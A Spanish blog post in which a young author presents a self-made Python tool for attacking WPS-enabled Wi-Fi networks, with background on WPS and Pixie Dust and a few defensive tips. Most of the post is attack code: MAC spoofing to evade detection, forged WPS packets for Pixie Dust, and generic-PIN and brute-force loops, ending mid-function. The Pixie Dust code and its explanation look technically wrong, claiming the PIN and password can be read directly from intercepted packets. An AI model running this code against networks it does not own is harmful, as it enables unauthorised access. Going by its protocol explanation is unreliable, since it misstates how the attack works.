---
layout: single
title: WPS Kraken
excerpt: "En este artículo muestro la herramienta que he creado para pentesting de redes con wps y la explicación de como funciona."
date: 2023-02-28
classes: wide
header:
  teaser: /assets/images/wps_kraken/portada.png
  teaser_home_page: true
  icon: /assets/images/Wifi-Hacking/wifi.webp
categories:
  - Wifi-Hacking
  - Programacion
tags:  
  - Wifi-Hacking
  - WPS
  - Python
---

![](/assets/images/wps_kraken/portada.png)

## ÍNDICE

- [INTRODUCCION](#1)
- [EXPLICACIÓN TEÓRICA](#2)
- [PROTOCOLO WPS](#WPS)
- [PIXIE DUST](#3)
- [MEDIAS DE SEGURIDAD](#SEG)
- [EXPLICACIÓN DEL CÓDIGO Y DEL FUNCIONAMIENTO](#4)

```
                    ⠀⠀⠀⠀⠀⠀ ⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                      ⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡿⠿⢿⣿⣷⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⣷⣠⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⡄⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣟⠉⢹⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠿⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⣰⣿⣿⡟⠁⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠈⢿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⣴⣾⣿⣿⣿⣿⣶⡀⢀⣾⣿⣿⠋⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠹⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⢸⣿⡁⠀⠀⢀⣿⣿⢇⣾⣿⣿⠃⠀⠀⠀⠀⠀⠀⣿⡈⠙⢿⣿⣿⣿⠿⠋⢩⡇⠀⠀⠀⠀⠀⠀⠙⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠈⠛⠛⣠⣴⣿⡿⠋⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⣿⣿⣶⣾⣿⣿⣿⣷⣶⣿⡇⠀⠀⠀⠀⠀⠀⠀⣻⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⣠⣾⣿⡿⠋⠀⠀⢻⣿⣿⣷⡀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⢠⣿⣿⣏⣠⣤⣶⣤⠀⠀⠀⠀
                    ⢰⣿⣿⣟⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣴⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀
                    ⢸⣿⣿⣿⣦⣄⣀⠀⠀⠀⠉⠙⠛⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⢻⣿⣄⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⢿⣿⣶⣄⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠈⠉⠉⠙⠛⠛⠛⠛⠛⣿⣿⣿⣿⠟⢋⣿⣿⣿⡿⠋⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠙⢿⣿⣧⡀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢀⣾⣿⣿⠟⠁⠀⣿⣿⣿⠟⠀⠀⢀⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠈⢿⣿⣷⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⠏⠀ ⠀⢸⣿⣿⣿⠀⠀⠀⢸⣿⣿⣿⠀⠈⢻⣿⣿⣿⢿⣿⣿⣦⡀⠀⠀⠀⣸⣿⣿⠀⣀⡄
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡟⠀⠀⠀⠸⣿⣿⣿⠀⠀⠀⢻⣿⣿⣿⠀⠀ ⠀⢻⣿⣿⡆⠹⢿⣿⣿⣶⣶⣾⣿⣿⣿⣿⠋⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀⢿⣿⣿⡆⠀⠀⠸⣿⣿⣿⡄⠀⠀⠀⢿⣿⣿⠀ ⠀⠙⠛⠿⠿⠿⠛⠋⢸⣿⠀⠀
                    ⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠘⣿⣿⣿⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀  ⠀⠀⢸⣿⠀⠀
                    ⠀⠀⠀⢠⣶⣿⣿⠿⠋⠁⠒⠛⢻⣷⠀⠀⠀⠀⠀⢹⣿⣿⡇⠀⣠⣿⣿⣿⢃⣴⣿⠟⠛⢿⣿⣿⡄⠀⠀⠀⠀⠀⠀⢠⣿⣿⠀⠀
                    ⠀⠀⢰⣿⣿⠟⠁⠀⠀⠀⠀⢀⣾⡟⠀⠀⠀⠀⠀⠘⣿⣿⣧⣾⣿⣿⠟⠁⣾⣿⡇⠀⠀⠘⢿⣿⣿⣦⡀⠀⠀⣀⣴⣿⣿⠃⠀⠀
                    ⠀⠀⣿⣿⡇⠀⠀⢀⡄⠀⢠⣿⣿⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⠟⠁⠀⠀⢿⣿⣇⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀
                    ⠀⠀⠹⣿⣷⣄⣀⣼⡇⠀⢸⣿⣿⡀⠀⠀⠀⠀⣠⣿⣿⣿⡿⠋⠀⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠈⠛⠛⠛⠋⠀⠀⠀⢻⣿⣿⣶⣶⣶⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠛⠛⠛⠉⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣷⣄⣀⠀⢀⣀⣴⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀                     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
```

<a id="1"></a>

Cuando estuve aprendiendo `wifi hacking` una de las ramas que no estudié en profundidad fué el protocolo `WPS`, por diversos motivos de complejidad... por lo que se me quedaron las ganas de aprender mas sobre el tema. Así que para aprender, un mes antes de navidad se me ocurrió hacer `una herramienta que automatizase diversos ataques` a las redes con este protocolo activo y así aprender como funciona todo a "bajo nivel". Aunque entre Bachiller y que me atasqué con la vulnerabilidad `Pixie Dust` no la he podido terminar hasta ayer a la tarde `(27/02/2023)`. 

También me parece recalcable (sobre todo si alguién quiere criticarme o yo que se), que esta herramienta la he hecho `con 17 años` con el único fin de `aprender`, por lo que no es una herramienta profesional y estoy segura de que se pueden mejorar y arreglar muchísimas cosas.  

Aquí dejo un video donde se muestra `como funciona` la herramienta de forma muy resumida y la estética que tiene:

[https://www.youtube.com/watch?v=fy_JU9MM2Os](https://www.youtube.com/watch?v=fy_JU9MM2Os)

Y también dejo el código:

[https://github.com/AirilMusic/Pentesting-Hacking/tree/main/wifi_hacking/wps_cracker](https://github.com/AirilMusic/Pentesting-Hacking/tree/main/wifi_hacking/wps_cracker)

Y por último y por si acaso, tengo que poner este mensaje:

`[NO ME HAGO RESPONSABLE DEL MAL USO QUE SE LE PUEDA DAR A ESTA HERRAMIENTA O A ESTA INFORMACIÓN]`

<a id="2"></a>
# EXPLICACIÓN TEÓRICA

<a id="WPS"></a>
## Protocolo WPS

EL protocolo `WPS (Wi-Fi Protected Setup)` es un protocolo que `facilita la conexión` de un dispositivo a una red inalambrica (wifi). 

El objetivo de este protocolo es `simplificar el proceso de configuración de seguridad` de una red, lo que permite no tener que memorizar contraseñaS, y una `conexión mas rápida`. Para esto hay dos formas de conectarse, una forma es `apretando un boton` que suele haber en los routers (aunque a veces esta escondido), de esta forma una vez hemos apretado el boton dependiendo de como esta configurado el `AP (Acces Point)` tines `60 o 120 segundos` para conectarte `sin proporcionar credenciales`. Y la otra forma es proporcionandole un `PIN` de 8 dígitos al AP, claro, esto es mas facil de explotar con fuerza bruta que una contraseña (aunque aún y todo lleva mucho tiempo) por lo que algunas compañías implementan medidas de seguridad como `tras x intentos fallidos bloquear la conexión vía WPS` durante X tiempo o hasta que se reinicie el router, por lo que antes que ponernos a hacer fuerza bruta como si no hubiese un mañana es recomendable probar otras técnicas como pueden ser probar pines con los que vienen `por defecto` los routers o la vulnerabilidad `Pixie Dust`. 

<a id="3"></a>
## Pixie Dust

![](/assets/images/wps_kraken/pixie_dust_diagram.png)

`Pixie Dust` es una técnica que permite explotar una vulnerabilidad en el protocolo `WPS` para obtener el `PIN` de acceso al AP en un `tiempo mucho menor` al necesario con fuerza bruta. Pero hay que aclarar que esta vulnerabilidad `fue corregida en el 2017` por lo que aunque sigue habiendo bastantes redes vulnerables, ya hay muchas que no se pueden explotar con esta técnica.

Esta técnica aprovecha un `defecto en la generación del PIN` de algunos routers que utilizan `chipsets Broadcom` y algunos `Realtek`.

La vulnerabilidad explotada por la técnica de `Pixie Dust` se encuentra en `la forma en que algunos routers generan el PIN` de conexión WPS.

Cuando un dispositivo intenta conectarse a un AP utilizando WPS, `se envía una solicitud` de conexión al AP. El `AP responde` con una petición de `autenticación`, que incluye un `nonce` y un `M1`, que son enviados al dispositivo para que genere un `M2` y asi hasta el `M4`.

En los routers afectados por la vulnerabilidad, los paquetes se `generan de forma predecible` predecible, lo que permite a un atacante `descubrir el PIN` en un corto periodo de tiempo, bastante mas rápido que utilizando fuerza bruta. 

<a id="SEG"></a>
# MEDIDAS DE SEGURIDAD

Para `prevenir` vulnerabiliades de seguridad relacionadas con el protocolo WPS hay varias medidas que podemos tomar (a parte de las que las compañias de wifis pueden tomar):

La primera y la mas importante es que a menos que sea 100% necesario `DESACTIVA EL WPS`, ya que no hace falta, con la forma tradicional de contraseña (handshake y todo eso) es mas que suficiente y la seguridad es considerablemente superior (aunque la mayoria de protocolos de seguridad (incluso WPA3) tienen vulnerabilidades).

Otra medida de seguridad muy importante que podemos tomar es `mantener actualizados todos los equipos` que tenemos (no solo nuestros ordenadores, moviles... sino que también los routers...), ya que asi si han `parcheado` las vulnerabilidades, podemos solucionar vulnerabilidades como pasa con `Pixie Dust`.

Otra medida en la que no tenemos tanto control pero si podemos mirar compañias que tomen esta medida, es que se pueden `limitar el numero de intentos erroneos de conectarte via WPS`. Así `evitamos ataques de fuerza bruta`. 

Y también es importante mirar que `nuestro router no tenga un PIN WPS genérico`, osea, de fábrica, como pueden ser `("00000000", "11111111", "12345670", "12349876", "98765432", "12345678")` y que sea un PIN aleatorio. 

<a id="4"></a>
# EXPLICACIÓN DEL CÓDIGO Y DEL FUNCIONAMIENTO

En este artículo no voy a explicar línea por línea (o casi) como hice en el de `"Cluedo Cheats"`, ya que lo mas interesante es saber el porque de cada cosa y sinó esto se haría eterno. 

Para eso explicare un poco el funcionamientro, la lógica de ejecución, y luego solamente las funciones:

## FUNCIONAMIENTO

Lo primero que necesitamos para que funcione es una `tarjeta de red`, recomiendo la `tplink` porque es la que utilizo (y aunque hace chanel hopping no afecta en el funcionamiento del programa) y solo he testeado la herramienta con eso, pero supongo que se podria utilizar otra (también es importante mencionar que lo he probado en `Parrot Security`, por lo que supongo que en otras distribuciones de linux como `Kali` también funcionara, pero no estoy segura):

![](/assets/images/wps_kraken/trajeta_de_red.jpg)

Ahora la conectamos y al ejecutar el script lo primero que hace es `mostrarnos las interfaces de red disponibles`, como no sabia como automatizar la detección de la interfaz de la tarjeta lo puse de forma manual, por lo tanto lo primero que tenemos que hacer es `seleccionar cual es la interfaz` de red de la tarjeta.

Luego lo que hace es `guardar` la dirección `MAC original`, para que se nos vuelva a poner una vez salgamos del programa sin necesidad de desconectar y volver a conectar la tarjeta, y le `cambia la MAC a una aleatoria`.

Seguidamente ckeckea que todos los programas necesarios esten instalados y si no lo están, los instala automaticamente: `wireshark`, `aircrack-ng`, `wpa_supplicant` 

Y ahora `checkea` que estemos ejecutando el programa en `Linux` y como el usuario `root o con permisos suid` y entra en un bucle que no se parará hasta que se cierre el programa. Dentro de este bucle se repiten las siguientes acciones y opciones:

Primero se muestran todas las redes disponibles.

Una vez las ha mostrado se pone en `modo monitor`.

Y ahora nos da cuatro opciones: `ataques`, `cambiar la mac`, `ayuda` y `salir`.

La primera opción nos da otras dos opciones: `ataques pasivos` y `ataqes activos`:

La primera opción sirve para `intentar conectarte` durante x tiempo cuando quieres que `la víctima le de al boton` o tú o quien sea, para conectarte de forma en la que no tengas que hacer ningún ataque, lo que `minimiza el ruido` que haces pero a la vez es mas complicado de efectuar. 

La segunda opción es mas compleja, es para `conectarte proporcionando el PIN WPS`, para esto dispone de varias fases, la primera es probar si puede obtener el PIN mediante `Pyxye Dust`, si no lo ha logrado prueba con `PINes genericos` que suelen tener varios routers, y por último ya hace `fuerza bruta`. Esto es así para mínimizar el número de intentos, lo que aumenta las posibilidades de éxito. 

La segunda opción del primer menú, nos da la posibilidad de volver a `cambiar la MAC`, por si queresmos seguir haciendo ataques pero para hacer menos ruido preferimos cambiarnos a otra MAC.

La tercera opción no creo que haga falta explicarla, porque basicamente son explicaciones muy por encima de como funciona la herramienta.

Y la última opción es salir, es decir, `cierra el programa de una forma segura`, primero `desactiva el modo monitor`, `vuelve a poner la MAC original` y cierra el programa. 

## PARTES

## CAMBIAR LA MAC

```py
def change_mac(iface, option):
    ifconfig_result2 = subprocess.check_output(["ifconfig", iface])
    macSearch2 = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result2))
    realMac2 = ""
    if macSearch2:
        realMac2 = macSearch2.group(0)
    
    if option == "new" and realMac2 == realMac:
        print("\n" + colored("[+]", 'green'), "Setting a new MAC...")
        chars = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f"]
        newMAC = "00:"
        for i in range(4):
            for a in range(2):
                newMAC += chars[random.randint(0,15)]
            newMAC += ":"
        for a in range(2):
            newMAC += chars[random.randint(0,15)]
        print(colored("[+]", 'green'), "new temporal MAC:", colored(str(newMAC), 'cyan'))
        
        call(["ifconfig", iface, "down"], stdout=DN, stderr=DN)
        call(["ifconfig", iface, "hw", "ether", newMAC])
        call(["ifconfig", iface, "up"], stdout=DN, stderr=DN)
    
    elif option == "old":
        print(colored("[+]", 'green'), "Setting old MAC...")
        call(["ifconfig", iface, "down"], stdout=DN, stderr=DN)
        call(["ifconfig", iface, "hw", "ether", realMac], stdout=DN, stderr=DN)
        call(["ifconfig", iface, "up"], stdout=DN, stderr=DN)
```

Lo primero que hace es con el comando ifconfig, `guardar la MAC` que actualmente tengamos en la interfaz de red que hayamos seleccionado. 

Luego dependiendo lo que queremos hacer hay dos opciones (poner una `nueva MAC`, o reestablecer la `MAC original`). La primera cambia la MAC por una nueva generada de forma `aleatoria`, la segunda basicamente `pone la MAC original` que el programa ha guardado al principio de su ejecución.

## PONER LA TARJETA DE RED EN MODO MONITOR

```py
def enable_monitor_mode(iface):
    print("\n" + colored("[+]", 'green'), "Starting monitor mode...")
    change_mac(iface, "new")
    call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)
    call(['iw', 'reg', 'set', 'BO'], stdout=DN, stderr=DN)
```

Esto basicamente `pone en modo monitor` la tarjeta de red con `airmong-ng` que es parte de `aircrack-ng`. Lo he hecho de esta forma para no complicarme demasiado haciendolo manualmente.

## DESACTIVAR EL MODO MONITOR

```py
def disable_monitor_mode(iface):
    print(colored("[+]", 'green'), "Disabling monitor mode...")
    call(['airmon-ng', 'stop', iface], stdout=DN, stderr=DN)
    call(["service", "network-manager", "start"], stdout=DN, stderr=DN)
    change_mac(iface, "old")
```

Esto es lo mismo que lo anterior pero para apagar el modo monitor.

## CHECKS

```py
def checks():
    print("\n" + colored("[+]", 'green'), "Checking requeriments... ")
    if str(subprocess.check_output(["which", "aircrack-ng"])) != "":
        print(colored("[+]", 'green'), "Aircrack installed")
    else:
        print(colored("[+]", 'green'), "Instaling aircrack-ng...")
        call(["apt-get", "install", "aircrack-ng", "-Y"])
        print(colored("[+]", 'green'), "Aircrack installed")
    if str(subprocess.check_output(["which", "wireshark"])) != "":
        print(colored("[+]", 'green'), "Wireshark installed")
    else:
        print(colored("[+]", 'green'), "Instaling wireshark...")
        call(["apt-get", "install", "wireshark", "-Y"])
    if str(subprocess.check_output(["which", "wpa_supplicant"])) != "":
        print(colored("[+]", 'green'), "WPA_Supplicant installed")
    else:
        print(colored("[+]", 'green'), "Instaling WPA_Supplicant...")
        call(["apt-get", "install", "wpasupplicant", "-Y"])
```

En esta funcion lo que hice fue `mirar si los programas` que necesita la herramienta para algunas cosas `estan instalados `con el comando `which` y si no lo estan instalarlos automaticamente con `apt-get install`.

## SIMPLE WPS CONNECT (ataque pasivo)

```py
def simpleWPSconect(conected, target):
    print(colored("\n[+]", 'green'), "Starting", colored("pasive", 'green'), "wps attack:")
    ptitext = str(colored("[-] How many time do you want to stay waiting ", 'yellow') + colored("(in minutes, for example: 10): ", 'cyan'))
    pasiveTime = int(input(ptitext))
    print(colored("[+]", 'green'), "Waiting for someone puss the wps button...")
    
    t = int(pasiveTime*60)
    t2 = int(t/50)
    cords1 = "\x1B[0K"
    
    for i in range(t2):
        tx1 = colored("[+] ", 'green')
        counter1 = colored("[00:00.00]", 'cyan')
        
        call(["wpa_cli", "wps_pbc", target], stdout=DN, stderr=DN)
        checkSconect = subprocess.check_output(["wpa_cli", "wps_pbc", target])
        checker1 = str('b"Selected interface ' + "'" + iface + "'" + r'\nOK\n"')
        
        if str(checkSconect) == checker1:
            conected = True
            print(colored("[+] CONECTED!", 'green'))
            break
        
        print("\n")
        
        if i != t2-1 and conected == False:
            t = 0
            while True:
                t += 1
                counter1 = colored(str(t), 'cyan')
                print(f'{cords1}{tx1}{counter1} Trying to conect WPS...')
                time.sleep(1)
                if t == 50:
                    break

        print("\n")

    if conected == False:
        print(colored("[!] Unable to connect to this network! ", 'red'))
```

Esto intenta conectarse a una red WPS cuando se `aprieta el botón` en el AP. Dependiendo de la compañia que proporciona los servicios y como esta configurado el AP, una vez pulsado el botón tienes `60 o 120 segundos` para intentar conectarte sin la necesidad de proporcionar contraseña, por lo que esta parte `se repite` x veces hasta que supere el tiempo que has puesto y `cada 50 segundos se intenta conectar a la red`. También intenté poner un contador pero no lo conseguí.

## PIXIE DUST

```py
def pixieDust(target, iface, SSID):
    print(colored("[+] ", 'green'), "Trying Pixie Dust attack...")
    try:
        pin_int = "-1"
        #### SEND M1 PACKAGE
        ifconfig_result = subprocess.check_output(["ifconfig", iface])
        src_mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result)) # local mac

        wps_info = wpa_supplicant.get_wps_info(iface) # package data
        wps_version = re.search(r"Version:\s+(\d+)", wps_info).group(1)
        wps_version1 = "WPSVersion=0x10"
        if wps_version == "2":
            "WPSVersion=0x20"
            
        cells = wifi.Cell.all(iface)
        ap = cells.filter(lambda cell: cell.ssid == SSID)[0]
        uuid = ap.uuid
        
        pixie_data = wps_version1 + \
                    " MsgType=0x00" + \
                    " UUID-E=" + uuid4().hex[:14] + \
                    " UUID=" + str(uuid) + \
                    " E-Hash1=" + hashlib.sha256(src_mac.encode()).hexdigest() + \
                    " AuthKey=" + hashlib.sha256((uuid4().hex[:14] + hashlib.sha256(src_mac.encode()).hexdigest()).encode()).hexdigest()

        print(colored("[+] ", 'green'), "Sending", colored("M1", 'yellow'), "package...")
        m1_packet = scapy.RadioTap() / scapy.Dot11(type=0, subtype=4, addr1=target, addr2=src_mac, addr3=target) / scapy.Dot11Beacon(cap="ESS+privacy") / scapy.Dot11Elt(ID="SSID", info=SSID) / scapy.Dot11Elt(ID="vendor", info=pixie_data)
        sendp(m1_packet, iface=iface, count=1, inter=0.1) # send M1 package from the iface

        #### RECEIVE M2 PACKAGE
        print(colored("[+] ", 'green'), "Reciving", colored("M2", 'yellow'), "package...")
        filter = "ether src " + ap.address + " and dot11Mgt.type == 0 and dot11Mgt.subtype == 5 and dot11Mgt.info == 'P\x00\x00\x00\x00\x00\x00\x00\x00'"
        m2_packet = sniff(iface=iface, filter=filter, count=1)[0] # capture M2 package
        
        #### SEND M3 PACKAGE
        print(colored("[+] ", 'green'), "Sending", colored("M3", 'yellow'), "package...")
        pixie_data = wps_version1 + \
                    " MsgType=0x04" + \
                    " Authenticator=" + hashlib.sha256((uuid4().hex[:14] + hashlib.sha256(src_mac.encode()).hexdigest()).encode()).hexdigest() + \
                    " E-Hash2=" + hashlib.sha256(m2_packet[scapy.Dot11Elt][0].payload[37:41]).hexdigest()

        # create M3 package
        m3_packet = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=m2_packet.addr2, addr2=m2_packet.addr1, addr3=m2_packet.addr1) / scapy.Dot11Elt(ID="vendor", info=pixie_data)
        sendp(m3_packet, iface=iface, count=1, inter=0.1) # send M3 package from the iface

        #### RECEIVE M4 PACKAGE
        print(colored("[+] ", 'green'), "Reciving", colored("M4", 'yellow'), "package...")
        filter = "ether src " + ap.address + " and dot11Mgt.type == 0 and dot11Mgt.subtype == 5 and dot11Mgt.info == 'P\x00\x00\x00\x00\x00\x00\x00\x00'"
        m4_packet = sniff(iface=iface, filter=filter, count=1)[0] # capture M4 package

        pixie_data = m4_packet[scapy.Dot11Elt][0].payload
        pin_hex = pixie_data[15:23] # extract PIN from payload
        pin_int = int(pin_hex, 16) % 10000000 # convert PIN from hex to int

        print(colored("[+]", 'green'), "PIN WPS found: " + colored(str(pin_int), 'cyan'))
    
        #### SEND M5 PACKAGE
        print(colored("[+] ", 'green'), "Sending", colored("M5", 'yellow'), "package...")
        pixie_data = wps_version1 + \
                    " MsgType=0x06" + \
                    " E-Hash1=" + hashlib.sha256(src_mac.encode()).hexdigest() + \
                    " AuthKey=" + hashlib.sha256((uuid4().hex[:14] + hashlib.sha256(src_mac.encode()).hexdigest()).encode()).hexdigest() + \
                    " WPS" + \
                    " Response=" + m4_packet[scapy.Dot11Elt][0].payload[37:41] + \
                    " STA=" + src_mac + \
                    " AP=" + ap.address

        # create M5 package
        m5_packet = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=m2_packet.addr2, addr2=m2_packet.addr1, addr3=m2_packet.addr1) / scapy.Dot11Elt(ID="vendor", info=pixie_data)
        sendp(m5_packet, iface=iface, count=1, inter=0.1) # send M5 package from the iface

        #### RECEIVE M6 PACKAGE
        print(colored("[+] ", 'green'), "Reciving", colored("M6", 'yellow'), "package...")
        filter = "ether src " + ap.address + " and dot11Mgt.type == 0 and dot11Mgt.subtype == 5 and dot11Mgt.info == 'P\x00\x00\x00\x00\x00\x00\x00\x00'"
        m6_packet = sniff(iface=iface, filter=filter, count=1)[0] # capture M6 package
        
        #### SEND M7 PACKAGE
        print(colored("[+] ", 'green'), "Sending", colored("M7", 'yellow'), "package...")
        pixie_data = wps_version1 + \
                    " MsgType=0x08" + \
                    " Authenticator=" + hashlib.sha256((uuid4().hex[:14] + hashlib.sha256(src_mac.encode()).hexdigest()).encode()).hexdigest() + \
                    " E-Hash2=" + hashlib.sha256(m6_packet[scapy.Dot11Elt][0].payload[37:41]).hexdigest()

        m7_packet = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=m2_packet.addr2, addr2=m2_packet.addr1, addr3=m2_packet.addr1) / scapy.Dot11Elt(ID="vendor", info=pixie_data)
        sendp(m7_packet, iface=iface, count=1, inter=0.1) # send M7 package from the iface
        
        #### RECEIVE M8 PACKAGE
        print(colored("[+] ", 'green'), "Receiving", colored("M8", 'yellow'), "package...")
        filter = "ether src " + ap.address + " and dot11Mgt.type == 0 and dot11Mgt.subtype == 5 and dot11Mgt.info == 'P\x00\x00\x00\x00\x00\x00\x00\x00'"
        m8_packet = sniff(iface=iface, filter=filter, count=1)[0] # capture M8 package

        pixie_data = m8_packet[scapy.Dot11Elt][0].payload
        pwd_hex = pixie_data[15:47] # extract password from payload
        password = binascii.unhexlify(pwd_hex).decode() # convert hex password to ascii string

        print(colored("[+]", 'green'), "Password WPS found: " + colored(str(password), 'cyan'))
        return str(password)

    except:
        return("-1")
```

La función recibe tres argumentos: `target`, que es la dirección MAC o `BSSID` del AP; `iface`, que es la `interfaz de red` a través de la cual se envían y reciben los paquetes; y `SSID`, que es el nombre de la red Wi-Fi.

La función utiliza varias librerías de Python, como `subprocess`, `re`, `hashlib`, `uuid`, `wifi`, `scapy` y `wpa_supplicant`, para recivir, crear y enviar una serie de paquetes que `aprovechan dicha vulnerabilidad` en el protocolo WPS para obtener la contraseña de la red.

También intenta `obtener información` de forma automatizada sobre la `interfaz de red` y la `versión del protocolo WPS` utilizando las librerías subprocess y wpa_supplicant. Y utilizando la librería `wifi` para buscar la red objetivo e interactuar con ella, también obtiene el `uuid` de la red, osea, el identificador único, y a partir de esto crea un paquete de datos `pixie_data`.

Y luego va `capturando` y `enviando` paquetes como se muestra en la foto de la explicación de este ataque, `utilizando la información de los paquetes anteriores` que ha recibido. Y en el paquete `M4` que es donde viaja el `PIN`, lo extrae. 

Ya luego continua con la secuencia de paquetes para conectarse a la red y `extrae la contraseña del paquete M8`. 

## FUERZA BRUTA Y PINS GENÉRICOS

```py
def brute_force_WPS(target, conected):
    checker2 = str('b"Selected interface ' + "'" + iface + "'" + r'\nFAIL\n"')
    
    generic_pins = ("00000000", "11111111", "12345670", "12349876", "98765432", "12345678")
    print(colored("[+] ", 'green') + "Trying " + colored("generic PINS...", 'green'))
    
    for i in range(len(generic_pins)):
        checkGconect = str(subprocess.check_output(["wpa_cli", "wps_pin", generic_pins[i], target]))
        if checkGconect != checker2:
            call(["wpa_cli", "wps_pin", generic_pins[i], target])
            print(colored("[+] CONECTED! ", 'green') + "PIN: " + colored(generic_pins[i], 'cyan'))
            conected = True
            break

    if conected == False:
        print(colored("[+] ", 'green'), "Starging brute force...")
        for i in range(0,99999999):
            rawPIN = str(i)
            OtoAdd = int(8 - len(rawPIN))
            pin = str(rawPIN.zfill(OtoAdd)) 
            checkBFconect = str(subprocess.check_output(["wpa_cli", "wps_pin", pin, target]))
            if checkBFconect != checker2:
                call(["wpa_cli", "wps_pin", pin, target], stdout=DN, stderr=DN)
